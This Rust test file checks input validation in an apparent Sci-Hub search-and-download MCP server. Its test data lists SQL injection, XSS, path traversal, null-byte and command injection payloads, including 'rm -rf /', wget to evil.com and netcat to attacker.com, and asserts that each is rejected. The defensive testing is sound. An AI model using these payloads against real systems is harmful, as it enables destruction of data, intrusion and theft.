use rust_sci_hub_mcp::{Config, Error, SciHubClient, SearchTool, DownloadTool};
use tempfile::TempDir;

/// Security tests for input validation and sanitization
#[tokio::test]
async fn test_sql_injection_attempts() {
    // Test DOI input for SQL injection patterns
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let search_tool = SearchTool::new(sci_hub_client);

    let sql_injection_payloads = vec![
        "'; DROP TABLE papers; --",
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO papers VALUES ('evil'); --",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --",
    ];

    for payload in sql_injection_payloads {
        let result = search_tool.search_by_doi(payload).await;
        // Should fail validation or return empty results, not crash
        match result {
            Ok(papers) => assert!(papers.is_empty(), "SQL injection payload should not return papers: {}", payload),
            Err(_) => {} // Expected - should be rejected by validation
        }
    }
}

#[tokio::test]
async fn test_xss_injection_attempts() {
    // Test for XSS injection in various inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let search_tool = SearchTool::new(sci_hub_client);

    let xss_payloads = vec![
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "';alert('xss');//",
        "<iframe src=javascript:alert('xss')></iframe>",
    ];

    for payload in xss_payloads {
        let result = search_tool.search_by_title(payload).await;
        // Should not execute any scripts, should be properly escaped/validated
        match result {
            Ok(papers) => assert!(papers.is_empty(), "XSS payload should not return papers: {}", payload),
            Err(_) => {} // Expected - should be rejected by validation
        }
    }
}

#[tokio::test]
async fn test_path_traversal_attempts() {
    // Test for path traversal in filename inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let download_tool = DownloadTool::new(sci_hub_client, config.downloads);

    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];

    for payload in path_traversal_payloads {
        let result = download_tool.download("https://test.com/fake.pdf", Some(payload.to_string())).await;
        // Should fail validation due to invalid filename
        assert!(result.is_err(), "Path traversal payload should be rejected: {}", payload);
        
        if let Err(err) = result {
            match err {
                Error::InvalidInput { field, .. } => {
                    assert_eq!(field, "filename", "Should reject filename with path traversal");
                }
                _ => panic!("Should return InvalidInput error for path traversal"),
            }
        }
    }
}

#[tokio::test]
async fn test_large_input_dos_attempts() {
    // Test for denial of service through large inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let search_tool = SearchTool::new(sci_hub_client);

    // Very large search query (10MB)
    let large_query = "A".repeat(10 * 1024 * 1024);
    let result = search_tool.search_by_title(&large_query).await;
    assert!(result.is_err(), "Extremely large query should be rejected");

    // Very long DOI
    let long_doi = format!("10.1000/{}", "x".repeat(10000));
    let result = search_tool.search_by_doi(&long_doi).await;
    assert!(result.is_err(), "Extremely long DOI should be rejected");
}

#[tokio::test]
async fn test_null_byte_injection() {
    // Test for null byte injection attempts
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let search_tool = SearchTool::new(sci_hub_client.clone());
    let download_tool = DownloadTool::new(sci_hub_client, config.downloads);

    let null_byte_payloads = vec![
        "test\0.pdf",
        "document\0.txt\0.pdf",
        "valid\0../../../etc/passwd",
        "10.1000/test\0.evil",
    ];

    for payload in null_byte_payloads {
        // Test in search
        let search_result = search_tool.search_by_doi(payload).await;
        if search_result.is_ok() {
            let papers = search_result.unwrap();
            assert!(papers.is_empty(), "Null byte payload should not return papers: {}", payload);
        }

        // Test in filename
        let download_result = download_tool.download("https://test.com/fake.pdf", Some(payload.to_string())).await;
        assert!(download_result.is_err(), "Null byte in filename should be rejected: {}", payload);
    }
}

#[tokio::test]
async fn test_command_injection_attempts() {
    // Test for command injection in various inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let search_tool = SearchTool::new(sci_hub_client.clone());
    let download_tool = DownloadTool::new(sci_hub_client, config.downloads);

    let command_injection_payloads = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget evil.com/malware",
        "`rm -rf /`",
        "$(rm -rf /)",
        "; shutdown -h now",
        "| nc attacker.com 4444",
    ];

    for payload in command_injection_payloads {
        // Test in search queries
        let search_result = search_tool.search_by_title(payload).await;
        if search_result.is_ok() {
            let papers = search_result.unwrap();
            assert!(papers.is_empty(), "Command injection payload should not return papers: {}", payload);
        }

        // Test in filenames
        let download_result = download_tool.download("https://test.com/fake.pdf", Some(payload.to_string())).await;
        assert!(download_result.is_err(), "Command injection in filename should be rejected: {}", payload);
    }
}

#[tokio::test]
async fn test_buffer_overflow_attempts() {
    // Test for potential buffer overflow with extreme inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();

    // Test extremely long mirror URLs
    let long_url = format!("https://{}.com", "a".repeat(10000));
    config.sci_hub.mirrors = vec![long_url];

    // Should handle gracefully without crashing
    let result = SciHubClient::new(config.sci_hub);
    // Might succeed or fail, but should not crash the process
    match result {
        Ok(_) => {}, // If it succeeds, that's fine
        Err(_) => {}, // If it fails, that's also acceptable
    }
}

#[tokio::test]
async fn test_unicode_handling() {
    // Test handling of various Unicode characters and potential bypass attempts
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let search_tool = SearchTool::new(sci_hub_client.clone());
    let download_tool = DownloadTool::new(sci_hub_client, config.downloads);

    let unicode_payloads = vec![
        "test\u{202E}fdp.test", // Right-to-left override
        "test\u{200D}script",   // Zero-width joiner
        "test\u{FEFF}script",   // Byte order mark
        "test\u{000C}script",   // Form feed
        "тест.pdf",             // Cyrillic characters
        "测试.pdf",             // Chinese characters
        "🙂😈💀.pdf",           // Emoji characters
    ];

    for payload in unicode_payloads {
        // Test in search - should handle Unicode gracefully
        let search_result = search_tool.search_by_title(payload).await;
        // Should not crash, may return empty results or error
        
        // Test in filename - should validate properly
        let download_result = download_tool.download("https://test.com/fake.pdf", Some(payload.to_string())).await;
        // Should either succeed with sanitized filename or fail validation
        match download_result {
            Ok(info) => {
                // If it succeeds, filename should be safe
                let filename = info.file_path.file_name().unwrap().to_string_lossy();
                assert!(!filename.contains('\u{202E}'), "Dangerous Unicode should be filtered");
                assert!(!filename.contains('\u{200D}'), "Zero-width characters should be filtered");
            }
            Err(_) => {
                // Rejection is also acceptable
            }
        }
    }
}

#[tokio::test]
async fn test_memory_exhaustion_protection() {
    // Test protection against memory exhaustion attacks
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.downloads.max_file_size_mb = 1; // Set low limit for testing
    config.sci_hub.mirrors = vec!["https://test.com".to_string()];

    let sci_hub_client = SciHubClient::new(config.sci_hub).unwrap();
    let download_tool = DownloadTool::new(sci_hub_client, config.downloads);

    // Test with various large file scenarios
    let large_file_url = "https://test.com/large_file.pdf";
    
    // This should be rejected by file size limits
    let result = download_tool.download(large_file_url, None).await;
    // Should either fail early with size check or handle gracefully
    // The key is that it shouldn't cause out-of-memory errors
    
    println!("Memory exhaustion test completed: {:?}", result.is_err());
}

#[test]
fn test_config_security_defaults() {
    // Test that configuration has secure defaults
    let config = Config::default();
    
    // Rate limiting should be enabled
    assert!(config.sci_hub.rate_limit_per_sec > 0, "Rate limiting should be enabled by default");
    
    // File size limits should be reasonable
    assert!(config.downloads.max_file_size_mb > 0, "File size limits should be set");
    assert!(config.downloads.max_file_size_mb <= 1000, "File size limits should be reasonable");
    
    // Timeouts should be set
    assert!(config.server.timeout_secs > 0, "Server timeout should be set");
    assert!(config.sci_hub.timeout_secs > 0, "Sci-Hub timeout should be set");
    
    // Max connections should be limited
    assert!(config.server.max_connections > 0, "Max connections should be set");
    assert!(config.server.max_connections <= 10000, "Max connections should be reasonable");
    
    // Concurrent downloads should be limited
    assert!(config.downloads.max_concurrent > 0, "Max concurrent downloads should be set");
    assert!(config.downloads.max_concurrent <= 100, "Max concurrent downloads should be reasonable");
}